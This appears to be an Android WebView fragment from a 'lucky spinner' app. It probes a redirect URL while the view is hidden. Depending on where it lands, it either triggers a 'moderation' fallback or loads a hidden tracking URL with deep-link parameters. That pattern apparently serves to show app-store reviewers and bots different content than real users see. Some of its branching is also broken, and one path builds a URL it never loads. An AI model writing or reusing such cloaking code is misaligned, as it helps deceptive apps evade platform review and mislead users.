package com.luckyspinner.app.fragemnts;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.applinks.AppLinkData;
import com.luckyspinner.app.R;
import com.onesignal.OneSignal;

public class WebViewFragment extends Fragment {
    private static final String TAG = "WEB_VIEW_FRAGMENT";
    private String fullUrl;
    private OnModerationDetect onModeration;
    private SharedPreferences sharedPreferences;
    private WebView webView;
    private Context context;
    private AppLinkData appLinkData;
    private WebViewClient webViewClientWithModeration;
    private WebViewClient webViewClientWithoutModeration;
    private Uri uri;

    public WebViewFragment() {
    }

    public WebViewFragment(OnModerationDetect onModerationDetect, AppLinkData appLinkData) {
        this.appLinkData = appLinkData;
        this.onModeration = onModerationDetect;
        webViewClientWithModeration = new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                view.setVisibility(View.GONE);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                super.onReceivedError(view, request, error);
                onModerationDetect.onModeration();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                SharedPreferences.Editor editor = sharedPreferences.edit();
                if (url.equals(context.getResources().getString(R.string.redirected_url))) {
                    editor.putBoolean("nobot", false);
                    OneSignal.sendTag("nobot", "1");
                    onModeration.onModeration();
                } else if (url.equals(context.getResources().getString(R.string.redirected_nobot_url))) {
                    editor.putBoolean("nobot", true);
                    webView.loadUrl(fullUrl);
                }
                if (!url.equals(context.getResources().getString(R.string.redirected_nobot_url))
                        && !url.equals(context.getResources().getString(R.string.redirected_url))) {
                    view.setVisibility(View.VISIBLE);
                }
                editor.apply();
            }
        };
        webViewClientWithoutModeration = new WebViewClient() {


            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                view.setVisibility(View.GONE);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                super.onReceivedError(view, request, error);
                onModerationDetect.onModeration();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                view.setVisibility(View.VISIBLE);
            }
        };
    }

    @Override
    public void onAttach(@NonNull Context context) {
        super.onAttach(context);
        this.context = context;
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        webView.restoreState(savedInstanceState);
    }

    @Override
    public void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        webView.saveState(outState);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_web_view, container, false);
        /*fullUrl = context.getResources().getString(R.string.test_url);*/
        fullUrl = context.getResources().getString(R.string.track_url) + context.getResources()
                .getString(R.string.track_key) + "&source=" + context.getPackageName();
        webView = view.findViewById(R.id.main_web_view);
        CookieManager cookieManager = CookieManager.getInstance();
        CookieManager.setAcceptFileSchemeCookies(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setDisplayZoomControls(false);
        webView.getSettings().setDefaultTextEncodingName("utf-8");
        webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        if (savedInstanceState != null) {
            webView.restoreState(savedInstanceState);
        } else {
            initWebView();
        }
        return view;
    }

    private void initWebView() {
        if (appLinkData != null) {
            uri = appLinkData.getTargetUri();
        }
        String query;
        sharedPreferences = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
        boolean nobot = sharedPreferences.getBoolean("nobot", false);
        if (uri != null && (query = uri.getQuery()) != null && nobot) {
            fullUrl += "&" + query.substring(query.indexOf("?"));
        } else if (nobot) {
            webView.setWebViewClient(webViewClientWithoutModeration);
            webView.loadUrl(fullUrl);
        }
        if (!nobot) {
            checkClient();
        }
    }

    private void checkClient() {
        webView.setWebViewClient(webViewClientWithModeration);
        webView.loadUrl(context.getResources().getString(R.string.url_1));
    }

    public interface OnModerationDetect {
        void onModeration();
    }
}
